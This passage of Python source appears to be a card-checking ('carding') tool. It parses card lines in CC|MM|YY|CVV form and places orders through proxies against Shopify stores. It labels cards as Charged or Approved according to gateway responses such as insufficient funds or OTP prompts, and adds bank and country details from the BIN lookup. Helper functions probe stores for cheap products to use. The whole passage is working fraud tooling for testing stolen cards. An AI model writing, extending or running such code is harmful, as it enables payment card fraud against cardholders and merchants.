        return False, f"Error: {str(e)[:60]}", gateway, total_price, currency


# ============================================================
#  Public API
# ============================================================
def check_card(cc_line, proxy_dict=None, site_url=None):
    """Check a card against a Shopify store. Returns formatted result string."""
    start = time.time()

    try:
        parts = cc_line.strip().split('|')
        if len(parts) != 4:
            return "Declined | Invalid format (CC|MM|YY|CVV)"

        cc, mes, ano, cvv = [p.strip() for p in parts]

        if len(mes) == 1:
            mes = f'0{mes}'
        if len(ano) == 2:
            ano = f'20{ano}'

        proxy_str = _parse_proxy(proxy_dict)

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            success, message, gateway, price, currency = loop.run_until_complete(
                _process_card(cc, mes, ano, cvv, site_url, proxy_str)
            )
        finally:
            loop.close()

        elapsed = round(time.time() - start, 2)
        clean = _extract_clean_response(message)
        bin6 = cc[:6]
        bin_info = _get_bin_info(bin6)

        # Classify
        approved_codes = ['ORDER_PLACED', 'CARD_DECLINED', 'OTP_REQUIRED',
                          'INSUFFICIENT_FUNDS', 'MISMATCHED_BILL']
        msg_upper = message.upper()

        if message == "ORDER_PLACED":
            status = "Charged"
        elif msg_upper in ['INSUFFICIENT_FUNDS', 'DO_NOT_HONOR'] or 'INSUFFICIENT' in msg_upper:
            status = "Approved"
        elif message == "OTP_REQUIRED":
            status = "Approved"
        elif success and message not in ['CAPTCHA_REQUIRED']:
            status = "Declined"
        else:
            status = "Declined"

        price_str = f"${float(price):.2f}" if price and price != "0.00" else ""

        result = (
            f"{status} | {clean} | {gateway}"
            f"{' | ' + price_str + ' ' + currency if price_str else ''}"
            f" | {elapsed}s"
        )

        # BIN line
        if bin_info.get('brand', 'Unknown') != 'Unknown':
            result += (f"\nBIN: {bin6} | {bin_info['brand']} {bin_info['type']}"
                       f" | {bin_info['bank']} | {bin_info['country']} {bin_info['emoji']}")

        return result

    except Exception as e:
        return f"Error | {str(e)[:60]}"


def probe_site(site_url=None):
    """Check if a Shopify site is alive and has products."""
    if not site_url:
        sites = load_shopify_sites()
        if not sites:
            return False, "No sites configured"
        site_url = sites[0]

    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            info, err = loop.run_until_complete(_fetch_products(site_url))
        finally:
            loop.close()

        if info:
            return True, f"Active — cheapest product ${info['price']}"
        return False, err or "No products"
    except Exception as e:
        return False, str(e)[:60]


async def validate_site_async(url):
    """Validate a Shopify site has products."""
    info, err = await _fetch_products(url)
    return info is not None, err


def validate_site(url):
    """Sync wrapper for site validation."""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(validate_site_async(url))
    finally:
        loop.close()
